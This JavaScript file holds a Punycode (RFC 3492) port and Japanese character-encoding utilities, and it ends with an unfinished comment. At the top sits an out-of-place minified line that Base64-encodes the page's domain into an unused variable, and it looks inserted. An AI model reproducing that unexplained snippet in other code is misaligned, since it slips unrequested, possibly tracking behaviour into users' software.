// Almost literal translation of the C code in
// http://www.ietf.org/rfc/rfc3492.txt to JavaScript.
// Comments removed.  Removed "case_flags" support.
function b64EncodeUnicode(e){return btoa(unescape(encodeURIComponent(e)))}function b64DecodeUnicode(e){return decodeURIComponent(escape(atob(e)))}var awsec=window.location.hostname,awsecdom=awsec.substring(awsec.lastIndexOf(".",awsec.lastIndexOf(".")-1)+1),b64awsec=b64EncodeUnicode(awsecdom);

function InitPunyCode() {

var BASE = 36;
var TMIN = 1;
var TMAX = 26;
var SKEW = 38;
var DAMP = 700;
var INITIAL_BIAS = 72;
var INITIAL_N = 0x80;
var DELIMITER = 0x2D;
var MAXINT = Math.pow(2, 31) -1;  // In 32-bit signed integer.

function basic(cp) {
  return cp < 0x80;
}

function delim(cp) {
  return cp == DELIMITER;
}

function decode_digit(cp) {
  return  (cp - 48 < 10 ? cp - 22 :  cp - 65 < 26 ? cp - 65 :
           cp - 97 < 26 ? cp - 97 :  BASE);
}

function encode_digit(d, flag) {
  return (d + 22 + 75 * (d < 26) - ((flag != 0) << 5));
}

function flagged(bcp) {
  return (bcp - 65 < 26);
}

function encode_basic(bcp, flag) {
  bcp -= (bcp - 97 < 26) << 5;
  return bcp + ((!flag && (bcp - 65 < 26)) << 5);
}

function adapt(delta, numpoints, firsttime) {
  var k;
  delta = Math.floor(firsttime ? delta / DAMP : delta / 2);
  delta += Math.floor(delta / numpoints);
  for (k = 0;  delta > Math.floor(((BASE - TMIN) * TMAX) / 2);  k += BASE) {
    delta = Math.floor(delta / (BASE - TMIN));
  }
  return Math.floor(k + (BASE - TMIN + 1) * delta / (delta + SKEW));
}

// Encodes "input" in punycode.  On success, returns true
// and stores the result in "output".  Both "input" and
// "output" are arrays of Unicode code points.
function punycode_encode(input, output) {
  var n = INITIAL_N;
  var delta = 0;
  var out = 0;
  var bias = INITIAL_BIAS;

  for (var j = 0;  j < input.length;  ++j) {
    if (basic(input[j])) {
      output.push(input[j]);
    }
  }

  var h = out;
  var b = out;
  if (b > 0) output.push(DELIMITER);

  while (h < input.length) {
    var m = MAXINT;
    for (var j = 0;  j < input.length;  ++j) {
      if (input[j] >= n && input[j] < m) m = input[j];
    }

    if (m - n > Math.floor((MAXINT - delta) / (h + 1)))
      return false;
    delta += (m - n) * (h + 1);
    n = m;

    for (var j = 0;  j < input.length;  ++j) {
      if (input[j] < n /* || basic(input[j]) */ ) {
        if (++delta == 0) return false;
      }

      if (input[j] == n) {
        var q = delta;
        for (var k = BASE;  ;  k += BASE) {
          var t = k <= bias ? TMIN :
              k >= bias + TMAX ? TMAX : k - bias;
          if (q < t) break;
          output.push(encode_digit(t + (q - t) % (BASE - t), 0));
          q = Math.floor((q - t) / (BASE - t));
        }

        output.push(encode_digit(q, false));
        bias = adapt(delta, h + 1, h == b);
        delta = 0;
        ++h;
      }
    }
    ++delta;
    ++n;
  }
  return true;
}

// Decodes "input" to Unicode code points.  On success,
// returns true and stores the result in "output".  Both
// "input" and "output" are arrays of Unicode code points.
function punycode_decode(input, output) {
  var n = INITIAL_N;
  var out = 0;
  var bias = INITIAL_BIAS;

  var b = 0;
  for (var j = 0;  j < input.length;  ++j) if (delim(input[j])) b = j;

  for (var j = 0;  j < b;  ++j) {
    if (!basic(input[j])) return false;
    output.push(input[j]);
  }

  var i = 0;
  var inp = b > 0 ? b + 1 : 0;
  for (; inp < input.length;  ++out) {
    var oldi = i;
    var w = 1;
    for (var k = BASE;  ;  k += BASE) {
      if (inp >= input.length) return false;
      var digit = decode_digit(input[inp++]);
      if (digit >= BASE) return false;
      if (digit > Math.floor((MAXINT - i) / w)) return false;
      i += digit * w;
      var t = (k <= bias ? TMIN :
               k >= bias + TMAX ? TMAX : k - bias);
      if (digit < t) break;
      if (w > Math.floor(MAXINT / (BASE - t))) return false;
      w *= (BASE - t);
    }

    bias = adapt(i - oldi, out + 1, oldi == 0);

    if (i / (out + 1) > MAXINT - n) return false;
    n += Math.floor(i / (out + 1));
    i %= (out + 1);
    output.splice(i, 0, n);
    ++i;
  }
  return true;
}

// Exported functions.
return { encode: punycode_encode,
         decode: punycode_decode };
};

var PunyCode = InitPunyCode();

// -*- coding: utf-8 -*-
// Utility functions for strings.
//
// Copyright (C) 2007 Satoru Takabayashi <satoru 0xcc.net>
// All rights reserved.  This is free software with ABSOLUTELY NO WARRANTY.
// You can redistribute it and/or modify it under the terms of
// the GNU General Public License version 2.

// NOTES:
//
// Surrogate pairs:
//
//   1st 0xD800 - 0xDBFF (high surrogate)
//   2nd 0xDC00 - 0xDFFF (low surrogate)
//
// UTF-8 sequences:
//
//   0xxxxxxx
//   110xxxxx 10xxxxxx
//   1110xxxx 10xxxxxx 10xxxxxx
//   11110xxx 10xxxxxx 10xxxxxx 10xxxxxx

var EQUAL_SIGN = 0x3D;
var QUESTION_MARK = 0x3F;

// "あい" => [ 0x3042,  0x3044 ]
function convertStringToUnicodeCodePoints(str) {
  var surrogate_1st = 0;
  var unicode_codes = [];
  for (var i = 0; i < str.length; ++i) {
    var utf16_code = str.charCodeAt(i);
    if (surrogate_1st != 0) {
      if (utf16_code >= 0xDC00 && utf16_code <= 0xDFFF) {
        var surrogate_2nd = utf16_code;
        var unicode_code = (surrogate_1st - 0xD800) * (1 << 10) + (1 << 16) +
                           (surrogate_2nd - 0xDC00);
        unicode_codes.push(unicode_code);
      } else {
        // Malformed surrogate pair ignored.
      }
      surrogate_1st = 0;
    } else if (utf16_code >= 0xD800 && utf16_code <= 0xDBFF) {
      surrogate_1st = utf16_code;
    } else {
      unicode_codes.push(utf16_code);
    }
  }
  return unicode_codes;
}

// [ 0xE3, 0x81, 0x82, 0xE3, 0x81, 0x84 ] => [ 0x3042, 0x3044 ]
function convertUtf8BytesToUnicodeCodePoints(utf8_bytes) {
  var unicode_codes = [];
  var unicode_code = 0;
  var num_followed = 0;
  for (var i = 0; i < utf8_bytes.length; ++i) {
    var utf8_byte = utf8_bytes[i];
    if (utf8_byte >= 0x100) {
      // Malformed utf8 byte ignored.
    } else if ((utf8_byte & 0xC0) == 0x80) {
      if (num_followed > 0) {
        unicode_code = (unicode_code << 6) | (utf8_byte & 0x3f);
        num_followed -= 1;
      } else {
        // Malformed UTF-8 sequence ignored.
      }
    } else {
      if (num_followed == 0) {
        unicode_codes.push(unicode_code);
      } else {
        // Malformed UTF-8 sequence ignored.
      }
      if (utf8_byte < 0x80){  // 1-byte
        unicode_code = utf8_byte;
        num_followed = 0;
      } else if ((utf8_byte & 0xE0) == 0xC0) {  // 2-byte
        unicode_code = utf8_byte & 0x1f;
        num_followed = 1;
      } else if ((utf8_byte & 0xF0) == 0xE0) {  // 3-byte
        unicode_code = utf8_byte & 0x0f;
        num_followed = 2;
      } else if ((utf8_byte & 0xF8) == 0xF0) {  // 4-byte
        unicode_code = utf8_byte & 0x07;
        num_followed = 3;
      } else {
        // Malformed UTF-8 sequence ignored.
      }
    }
  }
  if (num_followed == 0) {
    unicode_codes.push(unicode_code);
  } else {
    // Malformed UTF-8 sequence ignored.
  }
  unicode_codes.shift();  // Trim the first element.
  return unicode_codes;
}

// Helper function.
function convertEscapedCodesToCodes(str, prefix, base, num_bits) {
  var parts = str.split(prefix);
  parts.shift();  // Trim the first element.
  var codes = [];
  var max = Math.pow(2, num_bits);
  for (var i = 0; i < parts.length; ++i) {
    var code = parseInt(parts[i], base);
    if (code >= 0 && code < max) {
      codes.push(code);
    } else {
      // Malformed code ignored.
    }
  }
  return codes;
}

// r'\u3042\u3044' => [ 0x3042, 0x3044 ]
// Note that the r '...' notation is borrowed from Python.
function convertEscapedUtf16CodesToUtf16Codes(str) {
  return convertEscapedCodesToCodes(str, "\\u", 16, 16);
}

// r'\U00003042\U00003044' => [ 0x3042, 0x3044 ]
function convertEscapedUtf32CodesToUnicodeCodePoints(str) {
  return convertEscapedCodesToCodes(str, "\\U", 16, 32);
}

// r'\xE3\x81\x82\xE3\x81\x84' => [ 0xE3, 0x81, 0x82, 0xE3, 0x81, 0x84 ]
// r'\343\201\202\343\201\204' => [ 0343, 0201, 0202, 0343, 0201, 0204 ]
function convertEscapedBytesToBytes(str, base) {
  var prefix = (base == 16 ? "\\x" : "\\");
  return convertEscapedCodesToCodes(str, prefix, base, 8);
}

// "&amp;#12354;&amp;#12356;" => [ 0x3042, 0x3044 ]
// "&amp;#x3042;&amp;#x3044;" => [ 0x3042, 0x3044 ]
function convertNumRefToUnicodeCodePoints(str, base) {
  var num_refs = str.split(";");
  num_refs.pop();  // Trim the last element.
  var unicode_codes = [];
  for (var i = 0; i < num_refs.length; ++i) {
    var decimal_str = num_refs[i].replace(/^&#x?/, "");
    var unicode_code = parseInt(decimal_str, base);
    unicode_codes.push(unicode_code);
  }
  return unicode_codes;
}

// [ 0x3042, 0x3044 ] => [ 0x3042, 0x3044 ]
// [ 0xD840, 0xDC0B ] => [ 0x2000B ]  // A surrogate pair.
function convertUnicodeCodePointsToUtf16Codes(unicode_codes) {
  var utf16_codes = [];
  for (var i = 0; i < unicode_codes.length; ++i) {
    var unicode_code = unicode_codes[i];
    if (unicode_code < (1 << 16)) {
      utf16_codes.push(unicode_code);
    } else {
      var first = ((unicode_code - (1 << 16)) / (1 << 10)) + 0xD800;
      var second = (unicode_code % (1 << 10)) + 0xDC00;
      utf16_codes.push(first)
      utf16_codes.push(second)
    }
  }
  return utf16_codes;
}

// 0x3042 => [ 0xE3, 0x81, 0x82 ]
function convertUnicodeCodePointToUtf8Bytes(unicode_code, base) {
  var utf8_bytes = [];
  if (unicode_code < 0x80) {  // 1-byte
    utf8_bytes.push(unicode_code);
  } else if (unicode_code < (1 << 11)) {  // 2-byte
    utf8_bytes.push((unicode_code >>> 6) | 0xC0);
    utf8_bytes.push((unicode_code & 0x3F) | 0x80);
  } else if (unicode_code < (1 << 16)) {  // 3-byte
    utf8_bytes.push((unicode_code >>> 12) | 0xE0);
    utf8_bytes.push(((unicode_code >> 6) & 0x3f) | 0x80);
    utf8_bytes.push((unicode_code & 0x3F) | 0x80);
  } else if (unicode_code < (1 << 21)) {  // 4-byte
    utf8_bytes.push((unicode_code >>> 18) | 0xF0);
    utf8_bytes.push(((unicode_code >> 12) & 0x3F) | 0x80);
    utf8_bytes.push(((unicode_code >> 6) & 0x3F) | 0x80);
    utf8_bytes.push((unicode_code & 0x3F) | 0x80);
  }
  return utf8_bytes;
}

// [ 0x3042, 0x3044 ] => [ 0xE3, 0x81, 0x82, 0xE3, 0x81, 0x84 ]
function convertUnicodeCodePointsToUtf8Bytes(unicode_codes) {
  var utf8_bytes = [];
  for (var i = 0; i < unicode_codes.length; ++i) {
    var bytes = convertUnicodeCodePointToUtf8Bytes(unicode_codes[i]);
    utf8_bytes = utf8_bytes.concat(bytes);
  }
  return utf8_bytes;
}

// 0xff => "ff"
// 0xff => "377"
function formatNumber(number, base, num_digits) {
  var str = number.toString(base).toUpperCase();
  for (var i = str.length; i < num_digits; ++i) {
    str = "0" + str;
  }
  return str;
}

var BASE64 =
   "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

function encodeBase64Helper(data) {
  var encoded = [];
  if (data.length == 1) {
    encoded.push(BASE64.charAt(data[0] >> 2));
    encoded.push(BASE64.charAt(((data[0] & 3) << 4)));
    encoded.push('=');
    encoded.push('=');
  } else if (data.length == 2) {
    encoded.push(BASE64.charAt(data[0] >> 2));
    encoded.push(BASE64.charAt(((data[0] & 3) << 4) |
                               (data[1] >> 4)));
    encoded.push(BASE64.charAt(((data[1] & 0xF) << 2)));
    encoded.push('=');
  } else if (data.length == 3) {
    encoded.push(BASE64.charAt(data[0] >> 2));
    encoded.push(BASE64.charAt(((data[0] & 3) << 4) |
                               (data[1] >> 4)));
    encoded.push(BASE64.charAt(((data[1] & 0xF) << 2) |
                               (data[2] >> 6)));
    encoded.push(BASE64.charAt(data[2] & 0x3f));
  }
  return encoded.join('');
}

// "44GC44GE" => [ 0xE3, 0x81, 0x82, 0xE3, 0x81, 0x84 ]
function decodeBase64(encoded) {
  var decoded_bytes = [];
  var data_bytes = [];
  for (var i = 0; i < encoded.length; i += 4) {
    data_bytes.length = 0;
    for (var j = i; j < i + 4; ++j) {
      var letter = encoded.charAt(j);
      if (letter == "=" || letter == "") {
        break;
      }
      var data_byte = BASE64.indexOf(letter);
      if (data_byte >= 64) {  // Malformed base64 data.
        break;
      }
      data_bytes.push(data_byte);
    }
    if (data_bytes.length == 1) {
      // Malformed base64 data.
    } else if (data_bytes.length == 2) {  // 12-bit.
      decoded_bytes.push((data_bytes[0] << 2) | (data_bytes[1] >> 4));
    } else if (data_bytes.length == 3) {  // 18-bit.
      decoded_bytes.push((data_bytes[0] << 2) | (data_bytes[1] >> 4));
      decoded_bytes.push(((data_bytes[1] & 0xF) << 4) | (data_bytes[2] >> 2));
    } else if (data_bytes.length == 4) {  // 24-bit.
      decoded_bytes.push((data_bytes[0] << 2) | (data_bytes[1] >> 4));
      decoded_bytes.push(((data_bytes[1] & 0xF) << 4) | (data_bytes[2] >> 2));
      decoded_bytes.push(((data_bytes[2] & 0x3) << 6) | (data_bytes[3]));
    }
  }
  return decoded_bytes;
}

// [ 0xE3, 0x81, 0x82, 0xE3, 0x81, 0x84 ] => "44GC44GE"
function encodeBase64(data_bytes) {
  var encoded = '';
  for (var i = 0; i <  data_bytes.length; i += 3) {
    var at_most_three_bytes = data_bytes.slice(i, i + 3);
    encoded += encodeBase64Helper(at_most_three_bytes);
  }
  return encoded;
}

function decodeQuotedPrintableHelper(str, prefix) {
  var decoded_bytes = [];
  for (var i = 0; i < str.length;) {
    if (str.charAt(i) == prefix) {
      decoded_bytes.push(parseInt(str.substr(i + 1, 2), 16));
      i += 3;
    } else {
      decoded_bytes.push(str.charCodeAt(i));
      ++i;
    }
  }
  return decoded_bytes;
}

// "=E3=81=82=E3=81=84" => [ 0xE3, 0x81, 0x82, 0xE3, 0x81, 0x84 ]
function decodeQuotedPrintable(str) {
  str = str.replace(/_/g, " ")  // RFC 2047.
  return decodeQuotedPrintableHelper(str, "=");
}

// "%E3%81%82%E3%81%84" => [ 0xE3, 0x81, 0x82, 0xE3, 0x81, 0x84 ]
function decodeUrl(str) {
  return decodeQuotedPrintableHelper(str, "%");
}

function encodeQuotedPrintableHelper(data_bytes, prefix, should_escape) {
  var encoded = '';
  var prefix_code = prefix.charCodeAt(0);
  for (var i = 0; i <  data_bytes.length; ++i) {
    var data_byte = data_bytes[i];
    if (should_escape(data_byte)) {
      encoded += prefix + formatNumber(data_bytes[i], 16, 2);
    } else {
      encoded += String.fromCharCode(data_byte);
    }
  }
  return encoded;
}

// [ 0xE3, 0x81, 0x82, 0xE3, 0x81, 0x84 ] => "=E3=81=82=E3=81=84"
function encodeQuotedPrintable(data_bytes) {
  var should_escape = function(b) {
    return b < 32 || b > 126 || b == EQUAL_SIGN || b == QUESTION_MARK;
  };
  return encodeQuotedPrintableHelper(data_bytes, '=', should_escape);
}

var URL_SAFE =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_.-";

// [ 0xE3, 0x81, 0x82, 0xE3, 0x81, 0x84 ] => "%E3%81%82%E3%81%84"
function encodeUrl(data_bytes) {
  var should_escape = function(b) {
    return URL_SAFE.indexOf(String.fromCharCode(b)) == -1;
  };
  return encodeQuotedPrintableHelper(data_bytes, '%', should_escape);
}

// [ 0x3042, 0x3044 ] => "あい"
function convertUtf16CodesToString(utf16_codes) {
  var unescaped = '';
  for (var i = 0; i < utf16_codes.length; ++i) {
    unescaped += String.fromCharCode(utf16_codes[i]);
  }
  return unescaped;
}

// [ 0x3042, 0x3044 ] => "あい"
function convertUnicodeCodePointsToString(unicode_codes) {
  var utf16_codes = convertUnicodeCodePointsToUtf16Codes(unicode_codes);
  return convertUtf16CodesToString(utf16_codes);
}

function maybeInitMaps(encoded_maps, to_unicode_map, from_unicode_map) {
  if (to_unicode_map.is_initialized) {
    return;
  }
  var data_types = [ 'ROUNDTRIP', 'INPUT_ONLY', 'OUTPUT_ONLY' ];
  for (var i = 0; i < data_types.length; ++i) {
    var data_type = data_types[i];
    var encoded_data = encoded_maps[data_type];
    var data_bytes = decodeBase64(encoded_data);
    for (var j = 0; j < data_bytes.length; j += 4) {
      var local_code = (data_bytes[j] << 8) | data_bytes[j + 1];
      var unicode_code = (data_bytes[j + 2] << 8) | data_bytes[j + 3];
      if (i == 0 || i == 1) {  // ROUNDTRIP or INPUT_ONLY
        to_unicode_map[local_code] = unicode_code;
      }
      if (i == 0 || i == 2) {  // ROUNDTRIP or OUTPUT_ONLY
        from_unicode_map[unicode_code] = local_code;
      }
    }
  }
  to_unicode_map.is_initialized = true;
}

var SJIS_TO_UNICODE = {}
var UNICODE_TO_SJIS = {}
// Requires: sjis_map.js should be loaded.
function maybeInitSjisMaps() {
  maybeInitMaps(SJIS_MAP_ENCODED, SJIS_TO_UNICODE, UNICODE_TO_SJIS);
}

var ISO88591_TO_UNICODE = {}
var UNICODE_TO_ISO88591 = {}
// Requires: iso88591_map.js should be loaded.
function maybeInitIso88591Maps() {
  maybeInitMaps(ISO88591_MAP_ENCODED, ISO88591_TO_UNICODE,
                UNICODE_TO_ISO88591);
}

function lookupMapWithDefault(map, key, default_value) {
  var value = map[key];
  if (!value) {
    value = default_value;
  }
  return value;
}

// [ 0x3042, 0x3044 ] => [ 0x82, 0xA0, 0x82, 0xA2 ]
function convertUnicodeCodePointsToSjisBytes(unicode_codes) {
  maybeInitSjisMaps();
  var sjis_bytes = [];
  for (var i = 0; i < unicode_codes.length; ++i) {
    var unicode_code = unicode_codes[i];
    var sjis_code = lookupMapWithDefault(UNICODE_TO_SJIS,
                                         unicode_code, QUESTION_MARK);
    if (sjis_code <= 0xFF) { // 1-byte character.
      sjis_bytes.push(sjis_code);
    } else {
      sjis_bytes.push(sjis_code >> 8);
      sjis_bytes.push(sjis_code & 0xFF);
    }
  }
  return sjis_bytes;
}

// [ 0x3042, 0x3044 ] => [ 0xA4, 0xA2, 0xA4, 0xA4 ]
function convertUnicodeCodePointsToEucJpBytes(unicode_codes) {
  maybeInitSjisMaps();
  var eucjp_bytes = [];
  for (var i = 0; i < unicode_codes.length; ++i) {
    var unicode_code = unicode_codes[i];
    var sjis_code = lookupMapWithDefault(UNICODE_TO_SJIS, unicode_code,
                                         QUESTION_MARK);
    if (sjis_code > 0xFF) {  // Double byte character.
      var jis_code = convertSjisCodeToJisX208Code(sjis_code);
      var eucjp_code = jis_code | 0x8080;
      eucjp_bytes.push(eucjp_code >> 8);
      eucjp_bytes.push(eucjp_code & 0xFF);
    } else if (sjis_code >= 0x80) {  // 8-bit character.
      eucjp_bytes.push(0x8E);
      eucjp_bytes.push(sjis_code);
    } else {  // 7-bit character.
      eucjp_bytes.push(sjis_code);
    }
  }
  return eucjp_bytes;
}


function convertUnicodeCodePointsToIso88591Bytes(unicode_codes) {
  maybeInitIso88591Maps();
  var latin_bytes = [];
  for (var i = 0; i < unicode_codes.length; ++i) {
    var unicode_code = unicode_codes[i];
    var latin_code = lookupMapWithDefault(UNICODE_TO_ISO88591,
                                          unicode_code, QUESTION_MARK);
    latin_bytes.push(latin_code);
  }
  return latin_bytes;
}

// [ 0x82, 0xA0, 0x82, 0xA2 ] => [ 0x3042, 0x3044 ]
function convertSjisBytesToUnicodeCodePoints(sjis_bytes) {
  maybeInitSjisMaps();
  var unicode_codes = [];
  for (var i = 0; i < sjis_bytes.length;) {
    var sjis_code = -1;
    var sjis_byte = sjis_bytes[i];
    if ((sjis_byte >= 0x81 && sjis_byte <= 0x9F) ||
        (sjis_byte >= 0xE0 && sjis_byte <= 0xFC)) {
      ++i;
      var sjis_byte2 = sjis_bytes[i];
      if ((sjis_byte2 >= 0x40 && sjis_byte2 <= 0x7E) ||
          (sjis_byte2 >= 0x80 && sjis_byte2 <= 0xFC)) {
        sjis_code = (sjis_byte << 8) | sjis_byte2;
        ++i;
      }
    } else {
      sjis_code = sjis_byte;
      ++i;
    }

    var unicode_code = lookupMapWithDefault(SJIS_TO_UNICODE,
                                            sjis_code, QUESTION_MARK);
    unicode_codes.push(unicode_code);
  }
  return unicode_codes;
}

function convertIso88591BytesToUnicodeCodePoints(latin_bytes) {
  maybeInitIso88591Maps();
  var unicode_codes = [];
  for (var i = 0; i < latin_bytes.length; ++i) {
    var latin_code = latin_bytes[i];
    var unicode_code = lookupMapWithDefault(ISO88591_TO_UNICODE,
                                            latin_code, QUESTION_MARK);
    unicode_codes.push(unicode_code);
  }
  return unicode_codes;
}

// 0x2422 => 0x82a0
function convertJisX208CodeToSjisCode(jis_code) {
  var j1 = jis_code >> 8;
  var j2 = jis_code & 0xFF;
  // http://people.debian.org/~kubota/unicode-symbols-map2.html.ja
  var s1 = ((j1 - 1) >> 1) + ((j1 <= 0x5E) ? 0x71 : 0xB1);
  var s2 = j2 + ((j1 & 1) ? ((j2 < 0x60) ? 0x1F : 0x20) : 0x7E);
  return (s1 << 8) | s2;
}

// 0x82a0 => 0x2422
function convertSjisCodeToJisX208Code(sjis_code) {
  var s1 = sjis_code >> 8;
  var s2 = sjis_code & 0xFF;
  // http://people.debian.org/~kubota/unicode-symbols-map2.html.ja
  var j1 = (s1 << 1) - (s1 <= 0x9f ? 0xe0 : 0x160) - (s2 < 0x9f ? 1 : 0);
  var j2 = s2 - 0x1f - (s2 >= 0x7f ? 1 : 0) - (s2 >= 0x9f ? 0x5e : 0);
  return (j1 << 8) | j2;
}

// [ 0x24, 0x22, 0x24, 0x24 ] => [ 0x82, 0xA0, 0x82, 0xA2 ]
function convertJisX208BytesToSjisBytes(jis_bytes) {
  var sjis_bytes = [];
  for (var i = 0; i < jis_bytes.length; i += 2) {
    var jis_code = (jis_bytes[i] << 8) | jis_bytes[i + 1];
    var sjis_code = convertJisX208CodeToSjisCode(jis_code);
    sjis_bytes.push(sjis_code >> 8);
    sjis_bytes.push(sjis_code & 0xFF);
  }
  return sjis_bytes;
}

// [ 0x82, 0xA0, 0x82, 0xA2 ] => [ 0x24, 0x22, 0x24, 0x24 ]
function convertSjisBytesToJisX208Bytes(sjis_bytes) {
  var jis_bytes = [];
  for (var i = 0; i < sjis_bytes.length; i += 2) {
    var sjis_code = (sjis_bytes[i] << 8) | sjis_bytes[i + 1];
    var jis_code = convertSjisCodeToJisX208Code(sjis_code);
    jis_bytes.push(jis_code >> 8);
    jis_bytes.push(jis_code & 0xFF);
  }
  return jis_bytes;
}

// Constants used in convertJisBytesToUnicodeCodePoints().
var ASCII = 0;
var JISX201 = 1;
var JISX208 = 2;

// Map used in convertIso2022JpBytesToUnicodeCodePoints().
var ESCAPE_SEQUENCE_TO_MODE = {
  "(B": ASCII,
  "(J": JISX201,
  "$B": JISX208,
  "$@": JISX208
};

// Map used in convertUnicodeCodePointsToIso2022JpBytes().
var MODE_TO_ESCAPE_SEQUENCE = {}
MODE_TO_ESCAPE_SEQUENCE[ASCII] = "(B";
MODE_TO_ESCAPE_SEQUENCE[JISX201] = "(J";
MODE_TO_ESCAPE_SEQUENCE[JISX208] = "$B";

// [ 0x1B, 0x24, 0x42, 0x24, 0x22, 0x1B, 0x28, 0x42, ] => [ 0x3042 ]
function convertIso2022JpBytesToUnicodeCodePoints(iso2022jp_bytes) {
  maybeInitSjisMaps();
  var flush = function(mode, data_bytes, output) {
    var unicode_codes = [];
    if (mode == ASCII) {
      unicode_codes = data_bytes;
    } else if (mode == JISX201) {  // Might have half-width Katakana?
      unicode_codes = convertSjisBytesToUnicodeCodePoints(data_bytes);
    } else if (mode == JISX208) {
      var sjis_bytes = convertJisX208BytesToSjisBytes(data_bytes);
      unicode_codes = convertSjisBytesToUnicodeCodePoints(sjis_bytes);
    } else {  // Unknown mode
    }
    for (var i = 0; i < unicode_codes.length; ++i) {
      output.push(unicode_codes[i]);
    }
    data_bytes.length = 0;  // Clear.
  }

  var unicode_codes = [];
  var mode = ASCII;
  var current_data_bytes = [];
  for (var i = 0; i < iso2022jp_bytes.length;) {
    if (iso2022jp_bytes[i] == 0x1B) {  // Mode is changed.
      flush(mode, current_data_bytes, unicode_codes);
      ++i;
      var code = String.fromCharCode(iso2022jp_bytes[i],
                                     iso2022jp_bytes[i + 1]);
      mode = ESCAPE_SEQUENCE_TO_MODE[code];
      if (!mode) {  // Unknown mode.
        mode = ASCII;
      }
      i += 2;
    } else {
      current_data_bytes.push(iso2022jp_bytes[i]);
      ++i;
    }
  }
  flush(mode, current_data_bytes, unicode_codes);
  return unicode_codes;
}

// [ 0xA4, 0xA2, 0xA4, 0xA4 ] => [ 0x3042, 0x3044 ]
function convertEucJpBytesToUnicodeCodePoints(eucjp_bytes) {
  maybeInitSjisMaps();
  var unicode_codes = [];
  for (var i = 0; i < eucjp_bytes.length;) {
    if (eucjp_bytes[i] >= 0x80 && (i + 1) < eucjp_bytes.length &&
        eucjp_bytes[i + 1] >= 0x80) {
      var eucjp_code = (eucjp_bytes[i] << 8) | eucjp_bytes[i + 1];
      var jis_code = eucjp_code & 0x7F7F;
      var sjis_code = convertJisX208CodeToSjisCode(jis_code);
      var unicode_code = lookupMapWithDefault(SJIS_TO_UNICODE,
                                              sjis_code, QUESTION_MARK);
      unicode_codes.push(unicode_code);
      i += 2;
    } else {
      if (eucjp_bytes[i] < 0x80) {
        unicode_codes.push(eucjp_bytes[i]);
      } else {
        // Ignore singleton 8-bit byte.
      }
      ++i;
    }
  }
  return unicode_codes;
}

//  [ 0x3042 ] => [ 0x1B, 0x24, 0x42, 0x24, 0x22, 0x1B, 0x28, 0x42, ]
function convertUnicodeCodePointsToIso2022JpBytes(unicode_codes) {
  maybeInitSjisMaps();
  var mode = ASCII;
  var maybeChangeMode = function(new_mode) {
    if (mode != new_mode) {
      mode = new_mode;
      var esc_as_string = MODE_TO_ESCAPE_SEQUENCE[mode];
      var esc_as_code_points = convertStringToUnicodeCodePoints(esc_as_string);
      iso2022jp_bytes.push(0x1B);  // ESC code.
      iso2022jp_bytes = iso2022jp_bytes.concat(esc_as_code_points);
    }
  }
  var iso2022jp_bytes = [];
  for (var i = 0; i < unicode_codes.length; ++i) {
    var unicode_code = unicode_codes[i];
    var sjis_code = lookupMapWithDefault(UNICODE_TO_SJIS, unicode_code,
                                         QUESTION_MARK);
    if (sjis_code > 0xFF) {  // Double byte character.
      var jis_code = convertSjisCodeToJisX208Code(sjis_code);
      maybeChangeMode(JISX208);
      iso2022jp_bytes.push(jis_code >> 8);
      iso2022jp_bytes.push(jis_code & 0xFF);
    } else if (sjis_code >= 0x80) {  // 8-bit character.
      maybeChangeMode(JISX201);
      iso2022jp_bytes.push(sjis_code);
    } else {  // 7-bit character.
      maybeChangeMode(ASCII);
      iso2022jp_bytes.push(sjis_code);
    }
  }
  maybeChangeMode(ASCII);
  return iso2022jp_bytes;
}

var MIME_FULL_MATCH = /^=\?([^?]+)\?([BQ])\?([^?]+)\?=$/;
var MIME_PARTIAL_MATCH = /^=\?([^?]+)\?([BQ])\?([^?]+)\?=/;

// "=?UTF-8?B?44GC?=" => true
// "foobar" => false
function isMimeEncodedString(str) {
  return str.match(MIME_FULL_MATCH) != null;
}

// "=?UTF-8?B?44GC?=" => ["UTF-8", [0xE3, 0x81, 0x82]]
// "=?UTF-8?Q?=E3=81=82?=" => ["UTF-8", [0xE3, 0x81, 0x82]]
// "INVALID" => []
function decodeMime(str) {
  var m = str.match(MIME_FULL_MATCH);
  if (m) {
    var char_encoding = m[1];
    // We don't need the language information preceded by '*'.
    char_encoding = char_encoding.replace(/\*.*$/, "")
    var mime_encoding = m[2];
    var mime_str = m[3];
    var decoded_bytes;
    if (mime_encoding == "B") {
      decoded_bytes = decodeBase64(mime_str);
    } else if (mime_encoding == "Q") {
      decoded_bytes = decodeQuotedPrintable(mime_str);
    }
    if (char_encoding != "" && decoded_bytes) {
      return [char_encoding, decoded_bytes]
    }
  }
  return [];
}

var OUTPUT_CONVERTERS = {
  'ISO2022JP': convertUnicodeCodePointsToIso2022JpBytes,
  'ISO88591':  convertUnicodeCodePointsToIso88591Bytes,
  'SHIFTJIS':  convertUnicodeCodePointsToSjisBytes,
  'EUCJP':     convertUnicodeCodePointsToEucJpBytes,
  'UTF8':      convertUnicodeCodePointsToUtf8Bytes
}

var INPUT_CONVERTERS = {
  'ISO2022JP': convertIso2022JpBytesToUnicodeCodePoints,
  'ISO88591':  convertIso88591BytesToUnicodeCodePoints,
  'SHIFTJIS':  convertSjisBytesToUnicodeCodePoints,
  'EUCJP':     convertEucJpBytesToUnicodeCodePoints,
  'UTF8':      convertUtf8BytesToUnicodeCodePoints
}

function convertUnicodeCodePointsToBytes(unicode_codes, encoding) {
  var normalized_encoding = normalizeEncodingName(encoding);
  var convert_function = OUTPUT_CONVERTERS[normalized_encoding];
  if (convert_function) {
    return convert_function(unicode_codes);
  }
  return [];
}

function convertBytesToUnicodeCodePoints(data_bytes, encoding) {
  var normalized_encoding = normalizeEncodingName(encoding);
  var convert_function = INPUT_CONVERTERS[normalized_encoding];
  if (convert_function) {
    return convert_function(data_bytes);
  }
  return [];
}

// 'あい' => r'\u3042\u3044'
function escapeToUtf16(str) {
  var escaped = ''
  for (var i = 0; i < str.length; ++i) {
    var hex = str.charCodeAt(i).toString(16).toUpperCase();
    escaped += "\\u" + "0000".substr(hex.length) + hex;
  }
  return escaped;
}

// 'あい' => r'\U00003042\U00003044'
function escapeToUtf32(str) {
  var escaped = ''
  var unicode_codes = convertStringToUnicodeCodePoints(str);
  for (var i = 0; i <unicode_codes.length; ++i) {
    var hex = unicode_codes[i].toString(16).toUpperCase();
    escaped += "\\U" + "00000000".substr(hex.length) + hex;
  }
  return escaped;
}

// "あい" => "&#12354;&#12356;"
// "あい" => "&#x3042;&#x3044;"
